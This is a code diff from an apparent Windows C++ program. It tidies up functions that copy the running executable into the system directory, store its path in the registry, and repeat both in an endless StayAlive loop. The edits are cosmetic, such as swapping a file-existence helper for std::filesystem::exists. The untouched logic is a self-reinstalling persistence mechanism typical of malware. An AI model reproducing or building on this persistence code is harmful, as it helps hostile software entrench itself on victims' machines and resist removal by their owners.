@@ -3,34 +3,6 @@
 #include "Tools.hpp"
 #include "Debugger.hpp"
 
-BOOL FileExist(CONST PTCHAR filename)
-{
-	INT code = _taccess(filename, 0); // Checks for existence only - (mode = 0)
-	if (code == 0)
-		return TRUE;
-	else
-		switch (errno)
-		{
-		case EACCES:
-			_tprintf(TEXT("Access denied: the file's permission setting does not allow specified access.\n"));
-			break;
-
-		case ENOENT:
-			_tprintf(TEXT("File name or path not found.\n"));
-			break;
-
-		case EINVAL:
-			_tprintf(TEXT("Invalid parameter.\n"));
-			break;
-
-		default:
-			_tprintf(TEXT("Unknown error.\n"));
-			break;
-		}
-
-	return FALSE;
-}
-
 BOOL Copy2Sysdir(CONST PTCHAR appname)
 {
 	HMODULE hModule = NULL;
@@ -75,7 +47,7 @@ BOOL Copy2Sysdir(CONST PTCHAR appname)
 	}
 
 	// _tprintf(TEXT("filepath:%s, sysdir:%s\n"), filepath, sysdir);
-	if(!FileExist(sysdir))
+	if(!std::filesystem::exists(sysdir))
 		if (!CopyFileEx(filepath, sysdir, NULL, NULL, FALSE, COPY_FILE_FAIL_IF_EXISTS))
 		{
 			PrintError(TEXTH("CopyFile"), GetLastError());
@@ -121,7 +93,7 @@ BOOL SaveInReg(CONST PTCHAR appname)
 		return FALSE;
 	}
 
-	if (RegSetValueEx(hKey, appname, 0ul, REG_EXPAND_SZ, (BYTE*)sysdir, SMALL_BUFFER_LENGTH) != ERROR_SUCCESS)
+	if (RegSetValueEx(hKey, appname, 0ul, REG_EXPAND_SZ, reinterpret_cast<BYTE*>(sysdir), SMALL_BUFFER_LENGTH) != ERROR_SUCCESS)
 	{
 		PrintError(TEXTH("RegSetValueEx"), GetLastError());
 		if (RegCloseKey(hKey) != ERROR_SUCCESS)
@@ -142,7 +114,7 @@ BOOL SaveInReg(CONST PTCHAR appname)
 
 VOID StayAlive(CONST PTCHAR appname)
 {
-	while (TRUE)
+	for(;;)
 	{
 		Copy2Sysdir(appname);
 		SaveInReg(appname);
